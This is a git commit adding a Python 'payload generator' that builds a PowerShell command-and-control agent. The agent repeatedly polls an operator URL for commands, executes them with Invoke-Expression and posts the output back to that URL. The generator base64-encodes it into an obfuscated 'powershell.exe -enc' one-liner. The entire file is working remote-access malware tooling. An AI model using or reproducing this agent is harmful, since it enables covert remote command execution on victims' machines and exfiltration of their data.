55876e1e394f0f4b11a0e73b5ec5fc7d4a7208d6
ConstantinTi <54210903+ConstantinTi@users.noreply.github.com>
2022-12-14 14:22:35 +0100

    payload generator

---
+++ core/payload.py
@@ -0,0 +1,36 @@
+from base64 import b64encode
+
+def generate(url, sleep):
+    payload = """
+    $ProgressPreference = 'SilentlyContinue'
+    $sleep = %SLEEP%
+    $post = ''
+    while ($true)
+    {
+        Start-Sleep -Seconds $sleep
+        $cmd = Invoke-WebRequest '%URL%/test'
+        if ($cmd.Content -eq 'exit-agent') { break }
+        if ($cmd.Content -like '*set-sleep*') { $sleep = $cmd.Content.replace("set-sleep ", ""); continue }
+        if ($cmd.Content -eq '') { continue }
+
+        $result = Invoke-Expression $cmd
+        
+        if ($result -is [string]) { $post = $result }
+        elseif ($result -is [array])
+        {
+            foreach ($line in $result)
+            {
+                $post += $line.ToString() + "%NL%"
+            }
+        }
+
+        Invoke-RestMethod -Uri %URL%/test -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
+        $post = ''
+    }
+    """
+    payload = payload.replace("%SLEEP%", str(sleep))
+    payload = payload.replace("%URL%", url)
+    encoded = b64encode(payload.encode('UTF-16LE'))
+    print("")
+    print("powershell.exe -enc " + str(encoded).replace("b'", "").replace("'", ""))
+    print("")
